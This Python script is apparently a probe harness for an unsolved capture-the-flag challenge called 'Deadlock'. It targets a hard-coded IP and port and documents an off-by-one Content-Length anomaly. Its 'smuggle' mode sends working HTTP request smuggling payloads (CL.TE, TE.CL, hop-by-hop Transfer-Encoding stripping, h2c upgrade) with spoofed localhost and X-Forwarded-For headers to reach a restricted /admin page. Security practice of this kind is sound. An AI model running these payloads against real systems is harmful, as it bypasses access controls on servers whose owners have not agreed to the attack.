#!/usr/bin/env python3
"""
Deadlock — UNSOLVED probe / oracle harness.

Confirms the only structural anomaly we ever observed: every response from
159.194.199.67:5000 declares Content-Length: 50 but actually emits 51 body
bytes (`<h1>Portal</h1><p>Welcome. Admin is restricted.</p>`). A CL-strict
pipelined parser sees `>HTTP/1.1 …` for every response after the first.

Run:
    python3 probe.py            # baseline + pipelined dump
    python3 probe.py smuggle    # CL.TE / TE.CL / hop-by-hop attempts
"""

import re
import select
import socket
import sys
import time

HOST = "159.194.199.67"
PORT = 5000


def hit(raw, t=4.0):
    s = socket.create_connection((HOST, PORT), timeout=4)
    s.setblocking(False)
    s.sendall(raw)
    end = time.time() + t
    buf = b""
    while time.time() < end:
        r, _, _ = select.select([s], [], [], 0.05)
        if not r:
            continue
        try:
            c = s.recv(8192)
        except Exception:
            break
        if not c:
            break
        buf += c
    s.close()
    return buf


def baseline():
    print("=== single GET /admin ===")
    d = hit(b"GET /admin HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    print(repr(d))
    print()
    print("=== off-by-one demo (CL-strict parse of pipelined responses) ===")
    d = hit(
        b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"
        b"GET /admin HTTP/1.1\r\nHost: x\r\n\r\n"
        b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"
        b"GET /admin HTTP/1.1\r\nHost: x\r\n\r\n"
        b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n",
    )
    pos = 0
    idx = 0
    while pos < len(d):
        i = d.find(b"\r\n\r\n", pos)
        if i < 0:
            break
        cl = int(re.search(rb"Content-Length:\s*(\d+)", d[pos:i]).group(1))
        body_end = i + 4 + cl
        body = d[i + 4 : body_end]
        peek = d[body_end : body_end + 30]
        print(f"  [{idx}] CL={cl} body_tail={body[-20:]!r} next30={peek!r}")
        pos = body_end
        idx += 1


def smuggle():
    inner = (
        b"GET /admin HTTP/1.1\r\nHost: localhost\r\n"
        b"X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1\r\n\r\n"
    )
    cases = {
        "CL.TE empty chunk + smuggle": b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n" + inner,
        "TE.CL chunked": b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n"
        + f"{len(inner):x}\r\n".encode()
        + inner
        + b"\r\n0\r\n\r\n",
        "hop-by-hop strip TE": b"POST / HTTP/1.1\r\nHost: x\r\n"
        b"Connection: keep-alive, Transfer-Encoding\r\n"
        b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" + inner,
        "CL=exact /admin body": b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: "
        + str(len(inner)).encode()
        + b"\r\nConnection: keep-alive\r\n\r\n"
        + inner,
        "h2c upgrade": b"GET /admin HTTP/1.1\r\nHost: x\r\n"
        b"Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n"
        b"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n",
    }
    for name, raw in cases.items():
        print(f"=== {name} ===")
        d = hit(raw)
        n = d.count(b"HTTP/1.1 200 OK")
        print(f"  responses: {n}, total bytes: {len(d)}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "smuggle":
        smuggle()
    else:
        baseline()
